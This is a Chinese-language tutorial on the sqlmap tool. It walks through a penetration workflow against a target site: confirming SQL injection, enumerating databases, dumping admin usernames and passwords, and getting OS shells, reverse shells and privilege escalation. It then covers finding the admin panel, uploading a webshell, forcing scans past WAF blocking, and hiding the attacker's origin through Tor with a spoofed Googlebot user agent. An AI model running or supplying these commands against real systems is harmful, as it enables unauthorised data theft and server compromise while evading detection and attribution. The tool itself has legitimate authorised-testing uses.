Sqlmap使用
  GitHub 官方地址：https://github.com/sqlmapproject/sqlmap

在已有python的基础上，下载，进入目录就可以使用

使用sqlmap渗透常规思路
    1.获取信息
    通过“sqlmap -u url”命令对注入点进行漏洞确认，然后依次进行以下命令，来获取数据库信息：
    （1）列数据库信息：–dbs
    （2）web当前使用的数据库–current-db
    （3）web数据库使用账户 –current-user
    （4）列出数据库所有用户 –users
    （5）数据库账户与密码 –passwords
    （6）指定库名列出所有表 -D databasename–tables
    （7）指定库名表名列出所有字段-D antian365 -T admin –columns
    （8）指定库名表名字段dump出指定字段
    -D secbang_com -T admin -C  id,password ,username –dump
    -D antian365 -T userb -C&quot;email,Username,userpassword&quot; –dump
    2.有root权限的情况下可以系统访问权限尝试
       –os-cmd=OSCMD//执行操作系统命令
       –os-shell //反弹一个osshell
       –os-pwn //pwn，反弹msf下的shell或者vnc
       –os-smbrelay //反弹msf下的shell或者vnc
       –os-bof //存储过程缓存溢出
       –priv-esc //数据库提权
    3.通过查看管理员表，来获取管理员账号和密码，对加密账号还需要进行破解。
    4.寻找后台地址并登录。
    5.通过后台寻找上传漏洞，或者其它漏洞来尝试获取webshell权限。

使用总结：
使用burpsuite抓取请求包
python sqlmap.py -l /Desktop/inject.txt
基本上扫描网站会被WAF拦截，如：
    [15:10:22] [WARNING] there is a possibility that the target (or WAF/IPS/IDS) is resetting 'suspicious' requests
    [15:10:23] [CRITICAL] WAF/IPS/IDS identified as 'Generic (Unknown)'
可以在后面加上参数 --level 3 来强制扫描


匿名
使用sqlmap和Onion路由器来保护你的IP，DNS等等，在linux中，在终端命令符为$时使用sudo apt-get install tor tor-geoip
进入sqlmap的目录后:./sqlmap.py -u “http://www.targetvuln.com/index/php?cata_id=1” -b -a -tor –check-tor–user-agent=”Mozilla/5.0(compatible;Googlebot/2.1;+http://www.google.com/bot.html)”
参数–tor使用Tor，–check-tor会检查Tor是否被正确地使用，如果没有正确被使用，终端会提示错误信息。用户代理是googlebot，所有你的请求会被看起来像是Googlebot发出的一样。
利用sqlmap的Tor我们能够设置你的TOR代理来隐藏实际请求产生的地址
-tor-port，-tor-type：这两个参数能够帮你手动设置TOR代理，–check-tor参数会检查你的代理是否被正确地安装并正常的工作。
